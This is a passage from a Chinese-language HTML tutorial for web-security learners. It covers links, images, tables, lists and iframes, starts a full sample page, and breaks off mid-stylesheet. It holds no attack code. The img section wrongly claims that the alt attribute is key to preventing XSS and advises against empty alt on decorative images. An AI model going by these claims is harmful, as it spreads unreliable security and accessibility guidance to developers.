<h3 id="2-5-a标签、img标签、table标签"><a href="#2-5-a标签、img标签、table标签" class="headerlink" title="2.5 a标签、img标签、table标签"></a>2.5 a标签、img标签、table标签</h3><h4 id="a标签（超链接）"><a href="#a标签（超链接）" class="headerlink" title="a标签（超链接）"></a>a标签（超链接）</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 外部链接（新窗口打开） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>百度（新窗口打开）<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 锚点跳转 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section1&quot;</span>&gt;</span>跳转到章节1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section2&quot;</span>&gt;</span>跳转到章节2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 锚点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section1&quot;</span>&gt;</span>章节1<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section2&quot;</span>&gt;</span>章节2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 邮箱链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:example@example.com&quot;</span>&gt;</span>发送邮件<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 电话链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:+8613800138000&quot;</span>&gt;</span>拨打电话<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>安全注意事项：</strong></p>
<ul>
<li><code>rel=&quot;noopener noreferrer&quot;</code> 是必须的，防止新打开的页面通过<code>window.opener</code>访问原页面</li>
<li>避免直接使用<code>target=&quot;_blank&quot;</code>而不加<code>rel</code>属性，存在安全风险</li>
<li>锚点跳转应使用<code>id</code>属性，而非<code>name</code>属性</li>
</ul>
<h4 id="img标签（图像）"><a href="#img标签（图像）" class="headerlink" title="img标签（图像）"></a>img标签（图像）</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;网站Logo&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">loading</span>=<span class="string">&quot;lazy&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #ccc;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>关键属性：</strong></p>
<ul>
<li><code>src</code>：图像URL（必须）</li>
<li><code>alt</code>：替代文本，当图像无法加载时显示，对SEO和可访问性至关重要，也是防止XSS攻击的关键</li>
<li><code>width</code>&#x2F;<code>height</code>：设置图像尺寸（建议同时设置以避免布局抖动）</li>
<li><code>loading=&quot;lazy&quot;</code>：延迟加载，提升页面性能</li>
<li><strong>安全提示</strong>：始终设置<code>alt</code>属性，避免空alt（alt&#x3D;””）用于装饰性图片</li>
</ul>
<h4 id="table标签（表格）"><a href="#table标签（表格）" class="headerlink" title="table标签（表格）"></a>table标签（表格）</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>常见Web安全漏洞类型<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>漏洞类型<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>危害等级<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>检测方法<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>防御措施<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSS（跨站脚本）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>输入验证、输出编码检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>对用户输入进行过滤，对输出进行HTML编码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL注入<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL语句参数化查询检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>使用预编译语句、ORM框架<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRF（跨站请求伪造）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>中<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>检查Referer头、CSRF令牌验证<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>实施CSRF令牌机制、SameSite Cookie属性<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>表格结构详解：</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;table&gt;</code></td>
<td>表格容器</td>
<td>定义表格的开始和结束</td>
</tr>
<tr>
<td><code>&lt;caption&gt;</code></td>
<td>表格标题</td>
<td>放置在表格顶部，描述表格内容</td>
</tr>
<tr>
<td><code>&lt;thead&gt;</code></td>
<td>表头部分</td>
<td>包含表格的表头行，通常包含<code>&lt;tr&gt;</code>和<code>&lt;th&gt;</code></td>
</tr>
<tr>
<td><code>&lt;tbody&gt;</code></td>
<td>表格主体</td>
<td>包含表格的主要数据行</td>
</tr>
<tr>
<td><code>&lt;tfoot&gt;</code></td>
<td>表尾部分</td>
<td>包含表格的总结行（可选）</td>
</tr>
<tr>
<td><code>&lt;tr&gt;</code></td>
<td>表格行</td>
<td>定义一行数据</td>
</tr>
<tr>
<td><code>&lt;th&gt;</code></td>
<td>表头单元格</td>
<td>默认加粗并居中显示，用于表头</td>
</tr>
<tr>
<td><code>&lt;td&gt;</code></td>
<td>普通单元格</td>
<td>用于表格中的常规数据单元格</td>
</tr>
</tbody></table>
<p><strong>合并单元格示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>漏洞类型与防御措施<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>漏洞类型<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>防御措施<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>输入过滤<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>输出编码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>使用Content Security Policy (CSP)<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL注入<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>参数化查询、ORM框架<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>现代表格样式（推荐）：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> <span class="selector-tag">th</span>, <span class="selector-class">.security-table</span> <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.security-table</span> <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.high-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.medium-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#f39c12</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.low-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#2ecc71</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;security-table&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>常见Web安全漏洞类型<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>漏洞类型<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>危害等级<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>检测方法<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>防御措施<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSS（跨站脚本）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>输入验证、输出编码检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>对用户输入进行过滤，对输出进行HTML编码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL注入<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL语句参数化查询检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>使用预编译语句、ORM框架<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRF（跨站请求伪造）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;medium-risk&quot;</span>&gt;</span>中<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>检查Referer头、CSRF令牌验证<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>实施CSRF令牌机制、SameSite Cookie属性<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>表格使用注意事项：</strong></p>
<ul>
<li>不要用表格做页面布局，现代Web开发应使用CSS Flexbox或Grid</li>
<li>表格应只用于展示表格形式的数据</li>
<li>为表格添加适当的标题和描述，提高屏幕阅读器的可访问性</li>
</ul>
<h3 id="2-6-锚文本"><a href="#2-6-锚文本" class="headerlink" title="2.6 锚文本"></a>2.6 锚文本</h3><p>锚文本用于页面内跳转，通过<code>id</code>属性定义锚点，然后使用<code>&lt;a href=&quot;#id&quot;&gt;</code>链接到该位置。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 锚点链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section3&quot;</span>&gt;</span>跳转到章节3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 锚点定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section3&quot;</span>&gt;</span>章节3<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是章节3的内容，点击上方链接可快速跳转至此<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>最佳实践：</strong></p>
<ul>
<li>使用<code>id</code>属性定义锚点（现代标准），而非<code>name</code>属性</li>
<li>锚点ID应具有语义性，如<code>id=&quot;contact-form&quot;</code>而非<code>id=&quot;section1&quot;</code></li>
<li>避免在单页应用中过度使用锚点，可能影响用户体验</li>
</ul>
<h3 id="2-7-列表标签"><a href="#2-7-列表标签" class="headerlink" title="2.7 列表标签"></a>2.7 列表标签</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">style</span>=<span class="string">&quot;list-style-type: circle;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>项目1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>项目2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>项目3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;A&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>列表类型说明：</strong></p>
<ul>
<li>无序列表(<code>ul</code>)：项目符号样式可通过CSS控制（disc, circle, square）</li>
<li>有序列表(<code>ol</code>)：<code>type</code>属性可指定编号样式：<ul>
<li><code>1</code>：数字（默认）</li>
<li><code>A</code>：大写字母</li>
<li><code>a</code>：小写字母</li>
<li><code>I</code>：大写罗马数字</li>
<li><code>i</code>：小写罗马数字</li>
</ul>
</li>
<li><strong>现代实践</strong>：列表样式应使用CSS控制，而非HTML属性</li>
</ul>
<h3 id="2-8-框架的使用"><a href="#2-8-框架的使用" class="headerlink" title="2.8 框架的使用"></a>2.8 框架的使用</h3><p><strong>重要提示</strong>：<code>&lt;frameset&gt;</code> 在HTML5中已被废弃，<strong>不推荐使用</strong>。现代网页开发中应使用<code>&lt;iframe&gt;</code>嵌入其他页面。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;https://www.example.com&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">scrolling</span>=<span class="string">&quot;auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">title</span>=<span class="string">&quot;示例嵌入页面&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #ccc;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>iframe属性详解：</strong></p>
<ul>
<li><code>src</code>：嵌入页面的URL</li>
<li><code>width</code>&#x2F;<code>height</code>：尺寸（建议使用CSS控制）</li>
<li><code>scrolling</code>：滚动条行为（auto&#x2F;yes&#x2F;no）</li>
<li><code>title</code>：提供描述，提高可访问性</li>
<li><strong>安全注意</strong>：嵌入第三方内容时需谨慎，防止XSS攻击</li>
</ul>
<p><strong>安全提示</strong>：</p>
<ul>
<li>使用<code>allow</code>属性限制iframe功能</li>
<li>设置<code>sandbox</code>属性增强安全性</li>
<li>避免嵌入不可信的第三方内容</li>
<li>配置CSP的<code>frame-ancestors</code>指令控制iframe嵌入</li>
</ul>
<h2 id="综合示例：WEB安全学习平台"><a href="#综合示例：WEB安全学习平台" class="headerlink" title="综合示例：WEB安全学习平台"></a>综合示例：WEB安全学习平台</h2><p>以下是一个包含所有知识点的完整HTML页面示例，展示如何将各种HTML标签组合成一个实用的WEB安全学习页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;WEB安全HTML基础综合示例 - 安全培训课程&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;网络安全, WEB渗透, 数据安全, 渗透测试, 安全培训, HTML基础&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;moonsec&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-Frame-Options&quot;</span> <span class="attr">content</span>=<span class="string">&quot;DENY&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WEB安全学习平台 - HTML基础教程<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Microsoft YaHei&#x27;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.section</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-left</span>: <span class="number">4px</span> solid <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> <span class="selector-tag">th</span>, <span class="selector-class">.security-table</span> <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">        